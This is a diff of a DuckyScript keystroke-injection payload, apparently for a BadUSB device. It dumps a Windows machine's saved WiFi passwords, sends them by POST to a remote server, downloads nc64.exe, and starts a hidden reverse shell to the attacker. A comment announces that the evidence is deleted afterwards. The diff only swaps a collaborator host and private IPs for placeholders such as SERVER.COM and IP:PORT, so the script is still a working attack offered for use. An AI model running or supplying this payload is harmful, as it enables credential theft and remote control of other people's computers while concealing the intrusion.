@@ -12,15 +12,15 @@ STRING (netsh wlan show profiles) | Select-String "Perfil" | ForEach-Object { $p
 ENTER
 DELAY 6000
 REM Exfiltrate WiFi passwords to server (change URL to your real endpoint)
-STRING Invoke-WebRequest -Uri "http://c3g2je38vyn2rzg7kaheupbf369xxnlc.oastify.com/capture" -Method POST -InFile "$env:TEMP\wifi_passwords.txt" -ContentType "text/plain"
+STRING Invoke-WebRequest -Uri "http://SERVER.COM/capture" -Method POST -InFile "$env:TEMP\wifi_passwords.txt" -ContentType "text/plain"
 ENTER
 DELAY 5000
 REM Download reverse shell payload to temp location
-STRING Invoke-WebRequest -Uri "http://192.168.1.27:4444/nc64.exe" -OutFile "$env:TEMP\nc64.exe"
+STRING Invoke-WebRequest -Uri "http://IP:PORT/nc64.exe" -OutFile "$env:TEMP\nc64.exe"
 ENTER
 DELAY 5000
 REM Execute reverse shell payload (change IP and port accordingly)
-STRING Start-Process "$env:TEMP\nc64.exe" -ArgumentList '-e cmd.exe 192.168.1.27 5555' -WindowStyle Hidden
+STRING Start-Process "$env:TEMP\nc64.exe" -ArgumentList '-e cmd.exe IP 5555' -WindowStyle Hidden
 ENTER
 DELAY 4000
 REM Remove evidence: delete credentials file and payload
